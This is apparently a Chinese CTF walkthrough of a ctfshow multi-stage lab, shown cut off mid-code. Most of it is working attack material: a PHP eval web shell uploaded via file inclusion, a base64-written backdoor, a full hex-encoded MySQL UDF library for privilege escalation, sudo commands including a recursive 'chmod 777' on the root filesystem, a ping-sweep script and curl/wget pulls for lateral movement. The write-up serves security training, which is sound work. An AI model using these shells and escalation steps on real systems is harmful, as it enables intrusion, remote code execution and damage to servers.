<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">key_is_here_you_know</span><br></pre></td></tr></table></figure>

<p>common.php,文件包含</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#x27;dbutil.php&#x27;;</span><br><span class="line">if($_GET[&#x27;k&#x27;]!==shell_exec(&#x27;cat /FLAG/FLAG651&#x27;))&#123;</span><br><span class="line">    die(&#x27;651flag未拿到&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_POST[&#x27;file&#x27;]) &amp;&amp; file_exists($_POST[&#x27;file&#x27;]))&#123;</span><br><span class="line">    if(db::get_key()==$_POST[&#x27;key&#x27;])&#123;</span><br><span class="line">        include __DIR__.DIRECTORY_SEPARATOR.$_POST[&#x27;file&#x27;];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>在<code>init.php</code>得到了db文件位置，<code>/db/data_you_never_know.db</code></li>
</ul>
<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>数据恢复处上传文件，名字为1.dat  ，内容为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?=eval($_POST[1])?&gt;</span><br></pre></td></tr></table></figure>

<p>文件包含，即可命令执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/system36d/util/common.php?k=flag_651=ctfshow&#123;a4c64b86d754b3b132a138e3e0adcaa6&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">key=key_is_here_you_know&amp;file=../db/data_you_never_know.db&amp;1=echo shell_exec(&#x27;ls /&#x27;);</span><br></pre></td></tr></table></figure>

<h2 id="写入木马"><a href="#写入木马" class="headerlink" title="写入木马"></a>写入木马</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">key=key_is_here_you_know&amp;file=../db/data_you_never_know.db&amp;1=echo shell_exec(&quot;echo &#x27;PD89ZXZhbCgkX1BPU1RbMV0pPz4=&#x27; | base64 -d &gt; zhou.php&quot;);</span><br></pre></td></tr></table></figure>

<p>密码为1</p>
<p>getshell 但发现把命令执行函数都都禁用了，没能绕过disable_function,</p>
<p>查看这个文件发现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system36d/util/dbutil.php</span><br></pre></td></tr></table></figure>

<p>数据库信息</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">db</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$host</span>=<span class="string">&#x27;localhost&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$username</span>=<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$password</span>=<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$database</span>=<span class="string">&#x27;ctfshow&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$conn</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">get_key</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$conn</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">get_conn</span>();</span><br><span class="line">        <span class="variable">$res</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;select `key` from ctfshow_keys&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$res</span>)&#123;</span><br><span class="line">            <span class="variable">$row</span> = <span class="variable">$res</span>-&gt;<span class="title function_ invoke__">fetch_array</span>(MYSQLI_ASSOC);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="variable">$row</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">        <span class="built_in">self</span>::<span class="title function_ invoke__">close</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">get_username</span>(<span class="params"><span class="variable">$id</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$conn</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">get_conn</span>();</span><br><span class="line">        <span class="variable">$res</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;select `username` from ctfshow_users where id = (<span class="subst">$id</span>)&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$res</span>)&#123;</span><br><span class="line">            <span class="variable">$row</span> = <span class="variable">$res</span>-&gt;<span class="title function_ invoke__">fetch_array</span>(MYSQLI_ASSOC);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="built_in">self</span>::<span class="title function_ invoke__">close</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">get_conn</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">self</span>::<span class="variable">$conn</span>==<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="built_in">self</span>::<span class="variable">$conn</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="built_in">self</span>::<span class="variable">$host</span>, <span class="built_in">self</span>::<span class="variable">$username</span>, <span class="built_in">self</span>::<span class="variable">$password</span>, <span class="built_in">self</span>::<span class="variable">$database</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">self</span>::<span class="variable">$conn</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">self</span>::<span class="variable">$conn</span>!==<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="built_in">self</span>::<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>数据库连接</p>
<h2 id="udf提权"><a href="#udf提权" class="headerlink" title="udf提权"></a>udf提权</h2><p>在sqlmap 里有udf提权的文件，不同的SQLmap ,位置可能不一样</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">usr/share/sqlmap/data/udf/mysql/linux/64/lib_mysqludf_sys.so_</span><br></pre></td></tr></table></figure>

<p>由于加密过，需要用sqlmap,里的cloak.py -d -i 进行解密，解密后会在相同文件下生成</p>
<p><img src="/2023/05/29/ctfshow%E7%BB%88%E6%9E%81%E8%80%83%E6%A0%B8/QQ%E6%88%AA%E5%9B%BE20230530203117.png"></p>
<p><img src="/2023/05/29/ctfshow%E7%BB%88%E6%9E%81%E8%80%83%E6%A0%B8/QQ%E6%88%AA%E5%9B%BE20230530203252.png"></p>
<p>lib_mysqludf_sys.so,为生成的解密后，再将这个010打开，转为16进制，去掉换行，空格</p>
<p>生成文本，传入下面，由于过程比较复杂，所以，直接拿别人生成好的用，</p>
<p>推荐两个网站so,为16进制</p>
<p><a href="https://www.sqlsec.com/tools/udf.html">MySQL UDF 提权十六进制查询 | 国光 (sqlsec.com)</a></p>
<p><a href="https://www.isisy.com/1248.html">UDF文件十六进制编码 - Is Yang’s Blog (isisy.com)</a></p>
<p>适用于<strong>64位Linux操作系统</strong>UDF文件十六进制编码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<p>适用于<strong>32位Linux操作系统</strong>UDF文件十六进制编码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">7f454c4601010100000000000000000003000300010000007009000034000000581200000000000034002000040028001900180001000000000000000000000000000000f80e0000f80e00000500000000100000010000000010000000100000001000000801000010010000060000000010000002000000141000001410000014100000d0000000d0000000060000000400000051e5746400000000000000000000000000000000000000000600000004000000250000002a0000001400000008000000270000001d0000000000000000000000030000000000000011000000000000000a0000002900000012000000200000000000000000000000260000000c0000002100000017000000230000000d000000000000000e0000001c000000150000000000000006000000000000000000000010000000220000000f0000002400000019000000180000000000000000000000000000000000000000000000000000001a0000000200000013000000050000000000000000000000000000000000000000000000000000001f00000001000000280000000000000000000000000000000000000000000000070000002500000016000000000000000b00000000000000000000000000000000000000000000001e0000001b0000000000000000000000090000000000000000000000040000000000000011000000130000000400000007000000010804409019c7c9bda4080390046083130000001500000016000000180000001a0000001c0000001f00000021000000000000002200000000000000230000002400000026000000280000002900000000000000ce2cc0ba673c7690ebd3ef0e78722788b98df10ed871581cc1e2f7dea868be12bbe3927c7e8b92cd1e7066a9c3f9bfba745bb073371974ec4345d5ecc5a62c1cc3138aff36ac68ae3b9fd4a0ac73d1c525681b320b5911feab5fbe1200000000000000000000000000000000e7000000000000008d00000012000000c2000000000000005c00000012000000ba00000000000000e7040000120000000100000000000000000000002000000025000000000000000000000020000000ed000000000000007e02000012000000ab01000000000000150100001200000079010000000000007d00000012000000c700000000000000c600000012000000f50000000000000071010000120000009e01000000000000fb00000012000000cf00000000000000700000001200000010010000000000002500000012000000e0000000000000008901000012000000b500000000000000a80200001200000016000000000000000b0100002200000088010000000000007400000012000000fb00000000000000230000001200000080010000040d00006100000012000b00750000003b0a00000500000012000b0010000000f80d00000000000012000c003f010000a10c00002500000012000b001f010000100900000000000012000900c301000008110000000000001000f1ff96000000470a00000500000012000b0070010000ee0c00001600000012000b00cf01000010110000000000001000f1ff56000000310a00000500000012000b00020100009c0b00003000000012000b00a30100007d0d00003e00000012000b00390000002c0a00000500000012000b00320100006b0c00003600000012000b00bc01000008110000000000001000f1ff65000000360a00000500000012000b0025010000fc0b00006f00000012000b0085000000400a00000700000012000b0017010000cc0b00003000000012000b0055010000c60c00002800000012000b00a90000004c0a00008800000012000b008f010000650d00001800000012000b00d7000000d40a0000c800000012000b00005f5f676d6f6e5f73746172745f5f005f66696e69005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974007379735f6765745f6465696e6974007379735f657865635f6465696e6974007379735f6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c00666f726b00737973636f6e66006d6d6170007374726e6370790077616974706964007379735f6576616c006d616c6c6f6300706f70656e007265616c6c6f630066676574730070636c6f7365007379735f6576616c5f696e697400737472637079007379735f657865635f696e6974007379735f7365745f696e6974007379735f6765745f696e6974006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f657865630073797374656d007379735f73657400736574656e76007379735f7365745f6465696e69740066726565007379735f67657400676574656e76006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e312e3300474c4942435f322e3000474c4942435f322e310000000200030003000000000003000300030003000300030003000300030003000400030002000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000300b20100001000000000000000731f690900000400d4010000100000001069690d00000300e0010000100000001169690d00000200ea01000000000000040b000008000000b70b000008000000e70b000008000000110c000008000000220c000008000000550c0000080000008e0c000008000000ac0c000008000000d90c00000800000004110000080000006b0a0000020f00007c0a000002030000960a000002020000ad0a000002090000430b000002090000bc0a0000020c0000e40a0000020e0000f30a0000020e00003f0c0000020e00000e0b000002010000310b000002060000560b0000020a0000680b000002120000bf0b0000020d0000ef0b0000020d00005b0c0000020d0000960c0000020d0000b20c0000020d0000e10c0000020d0000fd0c000002080000580d000002110000770d0000020b00008e0d000002070000e410000006040000e810000006050000ec10000006100000fc1000000704000000110000071000005589e55383ec04e8000000005b81c3d40700008b93f4ffffff85d27405e81e000000e8b9000000e884040000585bc9c3ffb304000000ffa30800000000000000ffa30c0000006800000000e9e0ffffffffa3100000006808000000e9d0ffffff5589e55653e8ad00000081c37607000083ec1080bb1800000000755d8b83fcffffff85c0740e8b8314000000890424e8bcffffff8b8b1c0000008d831cffffff8d9318ffffff29d0c1f8028d70ff39f173208db6000000008d410189831c000000ff948318ffffff8b8b1c00000039f172e6c683180000000183c4105b5e5dc35589e553e82e00000081c3f706000083ec048b9320ffffff85d274158b93f8ffffff85d2740b8d8320ffffff890424ffd283c4045b5dc38b1c24c3905589e55dc35589e55dc35589e55dc35589e55dc35531c089e55dc35589e55dc35589e557565383ec0cfc83c9ff8b750c8b46088b3831c0f2aef7d18d59ffe8fcffffff83f8007c53753f83ec0c6a1ee8fcffffff5f596a006a00486a218d1418f7d06a0721d0506a00e8fcffffff83c42083f8ff89c7742351538b4608ff3057e8fcffffffffd7eb0b526a016a0050e8fcffffff31c083c410eb05b8010000008d65f45b5e5f5dc35589e557565383ec18fc6800040000e8fcffffffc70424010000008945e8e8fcffffffc6000089c68b450c595b31db68840e00008b4008ff30e8fcffffff8945eceb338b7de831c083c9fff2ae5252f7d18d79ff8d043b50568945f0e8fcffffff83c40c57ff75e889c68d041850e8fcffffff8b5df083c40cff75ec6a04ff75e8e8fcffffff83c41085c075b683ec0cff75ece8fcffffff83c410803e0075088b4518c60001eb16c6441eff0031c083c9ff89f7f2ae8b4514f7d14989088d65f489f05b5e5f5dc35589e583ec088b450c833801750a8b400431d28338007414505068140e0000ff7510e8fcffffffb20183c41088d0c9c35589e583ec088b450c833801750a8b400431d28338007414505068140e0000ff7510e8fcffffffb20183c41088d0c9c35589e55383ec048b550c8b5d10833a0274095050683f0e0000eb428b420483380074095050685e0e0000eb318b520c83ec0cc74004000000008b0283c00203420450e8fcffffff8b550883c41089420c31d285c07512505068860e000053e8fcffffffb20183c41088d08b5dfcc9c35589e583ec088b450c83380175128b4004833800750a8b4508c6000131c0eb14505068140e0000ff7510e8fcffffffb00183c410c9c35589e55383ec0c8b5d1068a00e000053e8fcffffff8b4514c7001e00000089d88b5dfcc9c35531d289e583ec088b450c8338007414525268bf0e0000ff7510e8fcffffffb20183c41088d0c9c35589e583ec148b450c8b4008ff30e8fcffffffc999c35589e557565383ec10fc8b550c8b45088b580c8b420c89df8b088d440b018945e88b42088b30f3a48b420c8b00c60403008b42088b4a0c8b7de88b70048b4904f3a48b420c8b55e88b4004c60402006a015253e8fcffffff8d65f45b5e5f5d99c35589e58b45088b400c85c074098945085de9fcffffff5dc35589e55783ec10fc8b450c8b4008ff30e8fcffffff83c41085c089c275088b4518c60001eb1131c083c9ff89d7f2ae8b4514f7d149890889d08b7dfcc9c390909090905589e55653e85dfcffff81c3260300008b8310ffffff83f8ff74198db310ffffff8db4260000000083ee04ffd08b0683f8ff75f45b5e5dc35589e55383ec04e8000000005b81c3ec020000e860fbffff595bc9c345787065637465642065786163746c79206f6e6520737472696e67207479706520706172616d657465720045787065637465642065786163746c792074776f20617267756d656e747300457870656374656420737472696e67207479706520666f72206e616d6520706172616d6574657200436f756c64206e6f7420616c6c6f63617465206d656d6f7279006c69625f6d7973716c7564665f7379732076657273696f6e20302e302e34004e6f20617267756d656e747320616c6c6f77656420287564663a206c69625f6d7973716c7564665f7379735f696e666fffffffff00000000ffffffff000000000000000001000000b20100000c000000100900000d000000f80d000004000000b4000000f5feff6ff8010000050000005805000006000000b80200000a000000f40100000b0000001000000003000000f010000002000000100000001400000011000000170000000009000011000000e0070000120000002001000013000000080000001600000000000000feffff6fa0070000ffffff6f01000000f0ffff6f4c070000faffff6f0a00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000141000000000000000000000560900006609000004110000004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200002e7368737472746162002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c2e64796e002e72656c2e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d65002e63746f7273002e64746f7273002e6a6372002e64796e616d6963002e676f74002e676f742e706c74002e64617461002e627373002e636f6d6d656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000f0000000500000002000000b4000000b400000044010000030000000000000004000000040000000b000000f6ffff6f02000000f8010000f8010000c000000003000000000000000400000004000000150000000b00000002000000b8020000b8020000a0020000040000000100000004000000100000001d00000003000000020000005805000058050000f40100000000000000000000010000000000000025000000ffffff6f020000004c0700004c070000540000000300000000000000020000000200000032000000feffff6f02000000a0070000a00700004000000004000000010000000400000000000000410000000900000002000000e0070000e007000020010000030000000000000004000000080000004a0000000900000002000000000900000009000010000000030000000a0000000400000008000000530000000100000006000000100900001009000030000000000000000000000004000000000000004e000000010000000600000040090000400900003000000000000000000000000400000004000000590000000100000006000000700900007009000088040000000000000000000010000000000000005f0000000100000006000000f80d0000f80d00001c00000000000000000000000400000000000000650000000100000032000000140e0000140e0000dd000000000000000000000001000000010000006d0000000100000002000000f40e0000f40e00000400000000000000000000000400000000000000770000000100000003000000001000000010000008000000000000000000000004000000000000007e000000010000000300000008100000081000000800000000000000000000000400000000000000850000000100000003000000101000001010000004000000000000000000000004000000000000008a00000006000000030000001410000014100000d000000004000000000000000400000008000000930000000100000003000000e4100000e41000000c00000000000000000000000400000004000000980000000100000003000000f0100000f01000001400000000000000000000000400000004000000a1000000010000000300000004110000041100000400000000000000000000000400000000000000a7000000080000000300000008110000081100000800000000000000000000000400000000000000ac000000010000000000000000000000081100009b0000000000000000000000010000000000000001000000030000000000000000000000a3110000b500000000000000000000000100000000000000</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1=file_put_contents(&#x27;udf.txt&#x27;,hex2bin(&#x27;7F454C4602010100000000000000000003003E00&#x27;));</span><br></pre></td></tr></table></figure>

<p>查看插件位置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show variables like &quot;%plugin%&quot;;</span><br></pre></td></tr></table></figure>

<p>查看是否能够写入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show global variables like &quot;secure%&quot;;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/05/29/ctfshow%E7%BB%88%E6%9E%81%E8%80%83%E6%A0%B8/QQ%E6%88%AA%E5%9B%BE20230530213014.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1=shell_exec(&#x27;cp udf.txt /usr/lib/mariadb/plugin/udf.so&#x27;);</span><br></pre></td></tr></table></figure>

<p>蚁剑执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE FUNCTION sys_eval RETURNS STRING SONAME &#x27;udf.so&#x27;;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/05/29/ctfshow%E7%BB%88%E6%9E%81%E8%80%83%E6%A0%B8/QQ%E6%88%AA%E5%9B%BE20230530204447.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select sys_eval(&#x27;sudo cat /root/you_win&#x27;)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag_654=ctfshow&#123;4ab2c2ccd0c3c35fdba418d8502f5da9&#125; </span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select sys_eval(&#x27;sudo chmod -R 777 /*&#x27;);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">key=key_is_here_you_know&amp;file=../db/data_you_never_know.db&amp;1=echo shell_exec(&quot;cat /F*/F*&quot;);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag_647=ctfshow&#123;e6ad8304cdb562971999b476d8922219&#125;flag_648=ctfshow&#123;af5b5e411813eafd8dc2311df30b394e&#125;flag_649=ctfshow&#123;9ad80fcc305b58afbb3a0c2097ac40ef&#125;flag_650=ctfshow&#123;5eae22d9973a16a0d37c9854504b3029&#125;flag_651=ctfshow&#123;a4c64b86d754b3b132a138e3e0adcaa6&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(E_ALL);</span><br><span class="line">$mysqli = new mysqli(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;ctfshow&quot;);</span><br><span class="line">$tmp = $mysqli-&gt;query($_POST[&#x27;sql&#x27;]);</span><br><span class="line">$result = $tmp-&gt;fetch_all();</span><br><span class="line">print_r($result);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<h2 id="内网横向渗透"><a href="#内网横向渗透" class="headerlink" title="内网横向渗透"></a>内网横向渗透</h2><p>由于shell 带不出来，disable_function也绕不过去，所以，就还是用shell打吧；蚁剑连接还可以上传文件，这个差不多够了</p>
<p>查看网段cat &#x2F;etc&#x2F;hosts </p>
<p>172.2.121.4</p>
<p>cat &#x2F;etc&#x2F;hosts</p>
<p>scan.sh 运行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">for ip in `seq 1 50`</span><br><span class="line">  do</span><br><span class="line">   &#123;</span><br><span class="line">  ping -c 1 172.2.121.$ip &gt;/dev/null 2&gt;&amp;1</span><br><span class="line">    if [ $? -eq 0 ];then</span><br><span class="line">     echo 172.2.121.$ip UP</span><br><span class="line">    else</span><br><span class="line">     echo 172.2.121.$ip DOWN</span><br><span class="line">   fi</span><br><span class="line">&#125;&amp;</span><br><span class="line">done</span><br><span class="line">wait</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">172.2.132.1 UP</span><br><span class="line">172.2.132.4 UP</span><br><span class="line">172.2.132.2 UP</span><br><span class="line">172.2.132.3 UP</span><br><span class="line">172.2.132.7 UP</span><br><span class="line">172.2.132.5 UP</span><br><span class="line">172.2.132.6 UP</span><br></pre></td></tr></table></figure>

<p>信息搜集一下，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1=echo shell_exec(&#x27;curl http://172.2.132.5/phpinfo.php&#x27;);</span><br></pre></td></tr></table></figure>

<p>disallowed &#x2F;public&#x2F;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1=echo shell_exec(&#x27;curl http://172.2.132.5/public/Readme.txt&#x27;);</span><br></pre></td></tr></table></figure>

<p>恭喜师傅来到第二关！ 第二关相比第一关，依旧是没有难度。 glhf!                ctshow 大菜鸡</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1=echo `wget http://172.2.132.5/www.zip`;</span><br></pre></td></tr></table></figure>

<p>，然后，访问下载，</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;dbutil.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$a</span>)&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;login&#x27;</span>:</span><br><span class="line">    	<span class="variable">$ret</span> = <span class="title function_ invoke__">login</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>]);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;index&#x27;</span>:</span><br><span class="line">    	<span class="variable">$ret</span> = <span class="title function_ invoke__">index</span>();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;main&#x27;</span>:</span><br><span class="line">    	<span class="variable">$ret</span> = <span class="title function_ invoke__">main</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>]);</span><br><span class="line">    	<span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">         <span class="variable">$ret</span> = <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(</span><br><span class="line">		<span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,</span><br><span class="line">		<span class="string">&#x27;message&#x27;</span>=&gt;<span class="string">&#x27;数据获取失败&#x27;</span>,</span><br><span class="line">		));</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$ret</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$html</span>=<span class="string">&#x27;管理员请注意，下面是最近登陆失败用户：&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="variable">$ret</span>=db::<span class="title function_ invoke__">query</span>(<span class="string">&#x27;select username,login_time,login_ip from ctfshow_logs  order by id desc limit 3&#x27;</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$ret</span> <span class="keyword">as</span> <span class="variable">$r</span>) &#123;</span><br><span class="line">    	<span class="variable">$html</span> .=<span class="string">&#x27;------------&lt;br&gt;用户名: &#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$r</span>[<span class="number">0</span>]).<span class="string">&#x27;&lt;br&gt;登陆失败时间: &#x27;</span></span><br><span class="line">    	.<span class="variable">$r</span>[<span class="number">1</span>]</span><br><span class="line">    	.<span class="string">&#x27;&lt;br&gt;登陆失败IP: &#x27;</span></span><br><span class="line">    	.<span class="variable">$r</span>[<span class="number">2</span>].</span><br><span class="line">    	<span class="string">&#x27;&lt;br&gt;------------&lt;br&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$html</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line">	<span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,</span><br><span class="line">	<span class="string">&#x27;message&#x27;</span>=&gt;<span class="string">&#x27;数据获取失败&#x27;</span>,</span><br><span class="line">	);</span><br><span class="line">	<span class="variable">$u</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$u</span>);</span><br><span class="line">	<span class="variable">$p</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$p</span>);</span><br><span class="line">	<span class="variable">$res</span> = db::<span class="title function_ invoke__">query</span>(<span class="string">&quot;select username from ctfshow_users where username = &#x27;<span class="subst">$u</span>&#x27; and password = &#x27;<span class="subst">$p</span>&#x27;&quot;</span>);</span><br><span class="line">	<span class="variable">$date</span> = <span class="keyword">new</span> <span class="title class_">DateTime</span>(<span class="string">&#x27;now&#x27;</span>);</span><br><span class="line">	<span class="variable">$now</span> = <span class="variable">$date</span>-&gt;<span class="title function_ invoke__">format</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>);</span><br><span class="line">	<span class="variable">$ip</span> = <span class="title function_ invoke__">addslashes</span>(<span class="title function_ invoke__">gethostbyname</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]));</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$res</span>)==<span class="number">0</span>)&#123;</span><br><span class="line"> 		 db::<span class="title function_ invoke__">insert</span>(<span class="string">&quot;insert into `ctfshow_logs` (`username`,`login_time`,`login_ip`) values (&#x27;<span class="subst">$u</span>&#x27;,&#x27;<span class="subst">$now</span>&#x27;,&#x27;<span class="subst">$ip</span>&#x27;)&quot;</span>);</span><br><span class="line">		 <span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="string">&#x27;账号或密码错误&#x27;</span>;</span><br><span class="line">		 <span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(!<span class="title function_ invoke__">auth</span>())&#123;</span><br><span class="line">		<span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="string">&#x27;AuthKey 错误&#x27;</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span 